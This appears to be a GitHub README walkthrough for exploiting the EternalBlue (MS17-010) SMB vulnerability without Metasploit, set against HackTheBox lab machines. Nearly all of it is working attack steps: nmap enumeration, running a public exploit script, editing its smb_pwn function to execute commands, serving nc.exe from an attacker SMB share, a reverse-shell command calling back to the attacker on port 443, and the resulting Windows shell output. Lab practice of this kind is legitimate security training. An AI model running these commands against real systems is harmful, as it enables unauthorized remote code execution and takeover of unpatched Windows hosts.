# How-to-exploit-the-EternalBlue-vulnerability-without-Metasploit

![Without Metasploit](https://www.kali.org/tools/metasploit-framework/images/metasploit-framework-logo.svg)

## [What is EternalBlue?](https://en.wikipedia.org/wiki/EternalBlue#:~:text=EternalBlue%20is%20a%20computer%20exploit,National%20Security%20Agency%20(NSA).)

->run this command with these nmap scripts to enumerate the smb port

`nmap --script "vuln and safe" -p445 ip -oN smbScan`

-> This is the EternalBlue

`smb-vuln-ms17-010`

-> [Clone this repository](https://github.com/worawit/MS17-010)

`git clone https://github.com/worawit/MS17-010`

-> You need to use python2 and pip2 if you don't have impacket execute this command if you have problems 

`pip2 install impacket`

-> Execute the checker.py and see the named pai

`python2 checker.py <ip>`

-> Open and edit the zzz_exploit.py and find the the funcion def smb_pwn(conn,arch) and comment this lines and unccoment this and write the command ping

```
def smb_pwn(conn, arch):
    #smbConn = conn.get_smbconnection()
	
    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
->unccoment	service_exec(conn, r'cmd /ping yourIP')
	# Note:c there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```

-> Now use tcpdump to be listening on the tun0 interface listening to see if we receive the ping 4 times after execute tcpdump execute the script  

`tcpdump -i tun0 icmp -n`

-> Execute the script write the named pai in the end of the command for example browser

`python2 zzz_exploit.py ipTARGET browser`

-> If you received now do this

-> Clone this [repository to use netcat](https://github.com/danielmiessler/SecLists)

`locate nc.exe`

`/usr/share/SecLists/Web-Shells/FuzzDB/nc.exe`

-> Move to the actual directory

`mv /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .`

-> now execute smbserver.py to offer the netcat

`smbserver.py smbFolder $(pwd)`

-> And in the function that we modified and commented previously now we have to edit it and put your ip and the resource the exploit is the same zzz_exploit.py

`service_exec(conn, r'cmd /c \\yourIP\smbFolder\nc.exe cmd yourIP 443')`

-> Now use rlwrap to recive the reverse shell

`rlwrap nc -nlvp 443`

-> Execute the script 

`python2 zzz_exploit.py tuIP namedPai`

-> And you win access 

```
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.4] 1034
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

-> You can practice in HackTheBox

->Blue Machine

![Blue](https://www.freecodecamp.org/news/content/images/2020/07/Screenshot-2020-07-29-at-21.06.35.png)

-> Legacy Machine

![Legacy](https://user-images.githubusercontent.com/114309996/211178040-b6c6b775-10ae-4095-b703-ea54d47ca635.png)

## If you want to support me you can suscribe to my youtube channel

[![YouTube](https://img.shields.io/badge/YouTube-MikeRega7-FF0000?style=for-the-badge&logo=youtube&logoColor=white&labelColor=101010)](https://youtube.com/@mikerega7724)

[![YouTube Channel Subscribers](https://img.shields.io/youtube/channel/subscribers/UC-ZBTT-Nd4t15sS-n5hrMUw?style=social)](https://youtube.com/@mikerega7724)

## Thank you have a nice day :)
